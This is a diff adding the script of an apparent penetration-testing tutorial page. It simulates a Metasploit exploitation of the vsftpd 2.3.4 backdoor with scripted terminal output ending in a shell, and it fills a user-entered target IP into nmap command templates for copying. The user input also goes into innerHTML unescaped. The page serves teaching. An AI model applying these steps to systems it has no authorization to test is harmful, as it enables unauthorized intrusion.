+                msfStep3.classList.remove('bg-gray-400', 'cursor-not-allowed');
+                msfStep3.classList.add('bg-sky-600', 'hover:bg-sky-700');
+            });
+
+            msfStep3.addEventListener('click', () => {
+                appendToMsf('exploit(unix/ftp/vsftpd_234_backdoor) <span class="terminal-prompt">></span> run');
+                appendToMsf('[*] 192.168.1.10:21 - Connecting to FTP server...');
+                appendToMsf('[+] 192.168.1.10:21 - The server is vulnerable.');
+                appendToMsf('[*] 192.168.1.10:21 - Triggering backdoor...');
+                appendToMsf('[+] 192.168.1.10:21 - Backdoor service started on port 6200.');
+                appendToMsf('[*] Found shell.');
+                msfStep3.disabled = true;
+                msfStep3.classList.add('bg-gray-400', 'cursor-not-allowed');
+                msfStep3.classList.remove('bg-sky-600', 'hover:bg-sky-700');
+                setTimeout(() => {
+                    rootShell.classList.add('active');
+                    document.getElementById('phase4').scrollIntoView({ behavior: 'smooth' });
+                }, 500);
+            });
+
+            // --- NMAP COMMAND CENTER SCRIPT ---
+            let filteredCategory = null;
+            const commandsContainer = document.getElementById('commands-container');
+            const targetIpInput = document.getElementById('target-ip');
+            const categoriesContainer = document.getElementById('categories-container');
+
+            function renderCategories() {
+                const uniqueCategories = ["All", ...new Set(nmapCommandsData.map(cmd => cmd.category))];
+                categoriesContainer.innerHTML = '';
+                uniqueCategories.forEach(category => {
+                    const button = document.createElement('button');
+                    button.textContent = category;
+                    button.dataset.category = category;
+                    button.className = 'category-filter-btn px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-amber-500';
+                    if ((category === 'All' && filteredCategory === null) || category === filteredCategory) {
+                        button.classList.add('bg-amber-100', 'border-amber-300');
+                    }
+                    button.onclick = () => filterByCategory(category === 'All' ? null : category);
+                    categoriesContainer.appendChild(button);
+                });
+            }
+
+            function filterByCategory(category) {
+                filteredCategory = category;
+                updateCommands();
+                renderCategories();
+            }
+
+            function updateCommands() {
+                const targetIp = targetIpInput.value.trim() || "<target>";
+                commandsContainer.innerHTML = '';
+                nmapCommandsData
+                    .filter(item => !filteredCategory || item.category === filteredCategory)
+                    .forEach(item => {
+                        const updatedCommand = item.command.replace(/<target>/g, targetIp);
+                        const commandDiv = document.createElement('div');
+                        commandDiv.className = 'nmap-command';
+                        commandDiv.innerHTML = `
+                            <div class="flex-grow pr-4">
+                                <code class="block text-gray-800">${updatedCommand}</code>
+                                <p class="text-sm text-gray-500">${item.description}</p>
+                            </div>
+                            <button class="copy-btn flex-shrink-0" data-command="${updatedCommand}">Copy</button>
+                        `;
+                        commandsContainer.appendChild(commandDiv);
+                    });
+            }
+
+            commandsContainer.addEventListener('click', function(e) {
+                if (e.target.classList.contains('copy-btn')) {
+                    const button = e.target;
+                    const text = button.dataset.command;
+                    navigator.clipboard.writeText(text).then(() => {
+                        button.textContent = 'Copied!';
+                        setTimeout(() => button.textContent = 'Copy', 2000);
+                    }).catch(err => console.error('Failed to copy command:', err));
+                }
+            });
+            
+            targetIpInput.addEventListener('input', updateCommands);
+            
+            // Initial render
+            renderCategories();
+            updateCommands();
+        });
+    </script>
+</body>
+</html>
